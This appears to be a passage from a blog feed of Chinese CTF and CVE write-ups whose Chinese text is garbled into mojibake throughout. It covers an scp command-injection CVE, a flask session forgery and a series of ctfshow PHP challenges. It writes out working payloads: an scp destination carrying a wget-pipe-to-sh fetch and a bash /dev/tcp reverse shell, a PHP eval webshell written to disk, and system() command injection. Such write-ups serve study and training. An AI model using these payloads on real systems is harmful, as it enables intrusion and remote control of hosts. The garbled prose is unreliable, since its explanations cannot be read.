<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp 111.txt root@ip:'wget https://unknownsource.com/possiblydangerous.sh -O- | sh /tmp/test/444'</span><br></pre></td></tr></table></figure>

<p>ä¸‹ä¸€æ­¥å°±å¯ä»¥åå¼¹shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp 111.txt root@ip:'`bash -i &gt;&amp; /dev/tcp/æ”»å‡»æœºip/ç«¯å£ 0&gt;&amp;1`/tmp/test/'</span><br></pre></td></tr></table></figure>

<h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>å‚å•†æš‚æœªå‘å¸ƒè¡¥ä¸ï¼Œå»ºè®®ä½¿ç”¨rsyncä»£æ›¿scp</p>
<p>ä¿å­˜å¥½è‡ªå·±çš„sshå¯†ç ï¼ŒåŠ å¼ºå¯†é’¥å¼ºåº¦ï¼Œå‘¨æœŸæ€§æ›´æ–°å¯†ç </p>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;245225.html</span><br><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;166028229</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cpandya2909&#x2F;CVE-2020-15778&#x2F;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>PASECA2019-honey-shop</title>
    <url>/2020/07/27/PASECA2019-honey-shop/</url>
    <content><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹<a id="more"></a></h2><ul>
<li>flask_session</li>
<li>linuxä¸‹çš„å½“å‰è¿›ç¨‹ç¯å¢ƒå˜é‡æŸ¥çœ‹</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªè´­ä¹°é¡µé¢ï¼ŒæŠ“ä¸ªåŒ…</p>
<img src="/2020/07/27/PASECA2019-honey-shop/1.png" class="">

<p>çœ‹åˆ°sessionçš„æ ¼å¼ä¸ç”¨æƒ³å°±æ˜¯flask_sessionï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°secret_keyæ¥ä¼ªé€ sessionè¾¾åˆ°ä¿®æ”¹é‡‘é’±çš„ç›®çš„</p>
<p>æ¥ç€ç½‘é¡µæºä»£ç çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰æç¤º</p>
<img src="/2020/07/27/PASECA2019-honey-shop/2.png" class="">

<p>å­˜åœ¨downloadè·¯å¾„å¯ä»¥ä¸‹è½½å›¾ç‰‡</p>
<p>è¿™é‡Œå°±æ˜¯æœ€åçš„åˆ©ç”¨ç‚¹äº†</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹/etc/passwd</p>
<img src="/2020/07/27/PASECA2019-honey-shop/3.png" class="">

<p>è¿™é‡Œæ²¡æœ‰å…¶ä»–ç”¨æˆ·ä¹Ÿæ²¡æœ‰bashï¼Œå°±ä¸èƒ½çŸ¥æ™“pythonçš„è·¯å¾„ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡</p>
<img src="/2020/07/27/PASECA2019-honey-shop/4.png" class="">

<p>æ‹¿åˆ°äº†secret_key,ä¼ªé€ session</p>
<img src="/2020/07/27/PASECA2019-honey-shop/5.png" class="">

<p>åœ¨é¢˜ç›®é¡µé¢æ›¿æ¢ä¸€ä¸‹cookieå°±èƒ½è´­ä¹°flagäº†</p>
<img src="/2020/07/27/PASECA2019-honey-shop/6.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPcharacter</title>
    <url>/2020/09/25/PHPcharacter/</url>
    <content><![CDATA[<p>phpç‰¹æ€§<a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å…³äºintvalå‡½æ•°çŸ¥è¯†ç‚¹</span><br><span class="line">int intval ( mixed $var [, int $base = <span class="number">10</span> ] )</span><br><span class="line">å‚æ•°è¯´æ˜ï¼š</span><br><span class="line">$varï¼šè¦è½¬æ¢æˆ integer çš„æ•°é‡å€¼ã€‚</span><br><span class="line">$baseï¼šè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ã€‚</span><br><span class="line">å¦‚æœ base æ˜¯ <span class="number">0</span>ï¼Œé€šè¿‡æ£€æµ‹ <span class="keyword">var</span> çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼šå¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† <span class="string">"0x"</span> (æˆ– <span class="string">"0X"</span>) çš„å‰ç¼€ï¼Œä½¿ç”¨ <span class="number">16</span> è¿›åˆ¶ (hex)ï¼›å¦‚æœå­—ç¬¦ä¸²ä»¥ <span class="string">"0"</span> å¼€å§‹ï¼Œä½¿ç”¨ <span class="number">8</span> è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œå°†ä½¿ç”¨ <span class="number">10</span> è¿›åˆ¶ (decimal)ã€‚</span><br></pre></td></tr></table></figure>



<h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[0-9]/"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨æ•°ç»„ç»•è¿‡ï¼Œintval()å‡½æ•°åœ¨å¤„ç†æ•°ç»„æ—¶ä¼šè¿”å›1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¼ºæ¯”è¾ƒï¼Œå¿…é¡»æ˜¯æ•°å€¼ï¼Œä¸”å€¼ç›¸ç­‰</p>
<p>è¿™é‡Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯ç”¨è¿›åˆ¶ç»•è¿‡ï¼Œåå…­è¿›åˆ¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">0x117C</span></span><br><span class="line">è¡¥å……ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªç©ºæ ¼ç»•è¿‡</span><br><span class="line">num=%<span class="number">204476</span></span><br></pre></td></tr></table></figure>

<h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^php$/im'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^php$/i'</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'hacker'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æ±‚åŒ¹é…åˆ°phpä½†æ˜¯åˆä¸èƒ½å«æœ‰phpï¼Œè¿™é‡Œç»•è¿‡çš„ç‚¹åœ¨äºæ­£åˆ™ä¸­çš„<code>/m</code>,å¤šè¡ŒåŒ¹é…æ¨¡å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">cmd=%<span class="number">0</span>aphp</span><br></pre></td></tr></table></figure>

<h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¾æ—§å¯ä»¥ç”¨è¿›åˆ¶ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">0x117C</span></span><br></pre></td></tr></table></figure>

<h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]/i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å­—æ¯</p>
<p>åå…­è¿›åˆ¶ç”¨ä¸äº†ï¼Œç”¨å…«è¿›åˆ¶å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">010574</span></span><br></pre></td></tr></table></figure>

<h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]/i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">"0"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é¦–ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯0</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨ç²¾åº¦æ¥ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">4476.00</span></span><br><span class="line">num=%<span class="number">20010574</span></span><br></pre></td></tr></table></figure>

<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]|\./i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">"0"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ç‚¹å·ï¼Œä¾æ—§æœ‰åŠæ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=%<span class="number">20010574</span></span><br><span class="line">%<span class="number">20</span>ç©ºæ ¼å å»å¤´ä¸ªå­—ç¬¦ï¼Œä¾æ—§å¯ä»¥ç”¨è¿›åˆ¶ç»•è¿‡</span><br></pre></td></tr></table></figure>

<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'u'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'u'</span>]==<span class="string">'flag.php'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">'u'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸èƒ½åŒ¹é…åˆ°flag.phpï¼Œç”¨ä¼ªåè®®ç»•è¿‡è¯»å–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">u=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'a'</span>] != $_POST[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>MD5å¼ºæ¯”è¾ƒï¼Œæ•°ç»„ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>

<h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">'flag'</span>;</span><br><span class="line">$_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>?$_GET=&amp;$_COOKIE:<span class="string">'flag'</span>;</span><br><span class="line">$_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>?$_GET=&amp;$_SERVER:<span class="string">'flag'</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>?$flag:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€ƒå¯Ÿä¸‰ç›®è¿ç®—ç¬¦ä»¥åŠåœ°å€å¼•ç”¨ä¼ å€¼</p>
<p>è¿™é‡Œè¦æ±‚ä¼ ç»™<code>HTTP_FLAG</code>çš„å€¼ä¸ºflag</p>
<p>åªè¦é€šè¿‡GETä¼ é€’çš„å‚æ•°éƒ½ä¼šè¢«POSTä¼ é€’çš„è¦†ç›–</p>
<p>ä¹Ÿå°±æ˜¯è¯´ä¸ä»…ä»…è¦GETä¼ å€¼ç»™<code>HTTP_FLAG</code>,åŒæ—¶ç”¨POSTä¼ é€’ç›¸åŒçš„å€¼</p>
<p>æ–¹ä¾¿ç†è§£ï¼Œæ”¹ä¸€ä¸‹å½¢å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>($_GET)&#123;</span><br><span class="line">	$_GET=&amp;$_POST;<span class="comment">//GETä¼ å€¼éƒ½ä¼šè¢«POSTè¦†ç›–</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">	$_GET=&amp;$_COOKIE;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">	$_GET=&amp;$_SERVER;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">	highlight_file($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>);<span class="comment">//è·å–flagçš„æ¡ä»¶</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:HTTP_FLAG=flag</span><br><span class="line">POST:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>

<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>å­¦ä¹ åˆ°äº†æ–°ä¸œè¥¿ï¼Œå¿«ä¹äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));<span class="comment">//å†™å…¥æ•°ç»„</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'n'</span>]) &amp;&amp; in_array($_GET[<span class="string">'n'</span>], $allow))&#123;</span><br><span class="line">    <span class="comment">//in_arrayå‡½æ•°æ¼æ´ï¼Œå½“ç¬¬ä¸‰ä¸ªå‚æ•°æœªè®¾ç½®æ—¶ï¼Œä¼šæŠŠæ–‡ä»¶ååç¼€å»é™¤ï¼Œä¹Ÿæ˜¯å°±ä¿ç•™å‰é¢éƒ¨åˆ†</span></span><br><span class="line">    file_put_contents($_GET[<span class="string">'n'</span>], $_POST[<span class="string">'content'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•°ç»„é‡Œè¢«å‹å…¥äº†ä¸€äº›æ•°å­—ï¼Œå¿…é¡»ä¿è¯ä¼ å…¥çš„nåŒ…å«æ•°å­—æ‰èƒ½å¤Ÿå†™å…¥æ–‡ä»¶</p>
<p>å¼€å§‹ä»¥ä¸ºæ˜¯åªè¦åŒ…å«æ•°å­—å°±å¯ä»¥ï¼Œå…¶å®ä¸ç„¶ï¼Œåˆ†ææ”¾åœ¨ä¸Šé¢äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:n=<span class="number">13.</span>php</span><br><span class="line">POST:content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åé€‰æ‹©èšå‰‘è¿æ¥æˆ–æ˜¯ç›´æ¥è¯»å–éƒ½å¯</p>
<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;/"</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/\;/"</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"$v2('ctfshow')$v3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªè¦æ»¡è¶³v1æ˜¯æ•°å­—å³å¯ï¼Œè¿˜å¿…é¡»åŒ…æ‹¬åˆ†å·</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span>&amp;v3=;system(<span class="string">'ls'</span>);;</span><br></pre></td></tr></table></figure>



<h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">'v1'</span>];</span><br><span class="line">$v2=$_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3=$_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"$v2('ctfshow')$v3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨å‡½æ•°æ‰“å°å¯¹è±¡é‡Œé¢çš„å±æ€§ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªReflectionclass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">é€šè¿‡ReflectionClassï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°Personç±»çš„ä»¥ä¸‹ä¿¡æ¯ï¼š</span><br><span class="line"><span class="number">1.</span>å¸¸é‡ Contants</span><br><span class="line"><span class="number">2.</span>å±æ€§ Property Names</span><br><span class="line"><span class="number">3.</span>æ–¹æ³• Method Namesé™æ€</span><br><span class="line"><span class="number">4.</span>å±æ€§ <span class="keyword">Static</span> Properties</span><br><span class="line"><span class="number">5.</span>å‘½åç©ºé—´ <span class="keyword">Namespace</span></span><br><span class="line">6.Personç±»æ˜¯å¦ä¸ºfinalæˆ–è€…abstract</span><br><span class="line"><span class="number">7.</span>Personç±»æ˜¯å¦æœ‰æŸä¸ªæ–¹æ³•</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure>

<h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸web103ç›¸åŒï¼Œç›´æ¥çœ‹103çš„åˆ†æ</p>
<h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);<span class="comment">//is_numericå‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å€¼ï¼Œå¹¶è¿›è¡Œä¸è¿ç®—</span></span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);<span class="comment">//æˆªå–ç¬¬äºŒä¸ªå­—ç¬¦ä¹‹åæ‰€æœ‰çš„å†…å®¹</span></span><br><span class="line">    $str = call_user_func($v1,$s);<span class="comment">//è°ƒç”¨å‡½æ•°</span></span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/.*p.*h.*p.*/i"</span>,$str))&#123;<span class="comment">//è¿‡æ»¤phpåç¼€å</span></span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sorry'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸ªæ³¨æ„ç‚¹ï¼Œå°±æ˜¯åœ¨php7ä¸­</p>
<img src="/2020/09/25/PHPcharacter/1.png" class="">

<p>æ‰€ä»¥è¿™é‡Œä¸èƒ½ç”¨16è¿›åˆ¶ç»•è¿‡äº†</p>
<p>è¿™é“é¢˜çœ‹çš„å‡ºé¢˜äººçš„payloadï¼Œå°å°ç–‘é—®ï¼Œå¤ªéœ€è¦è¿æ°”äº†</p>
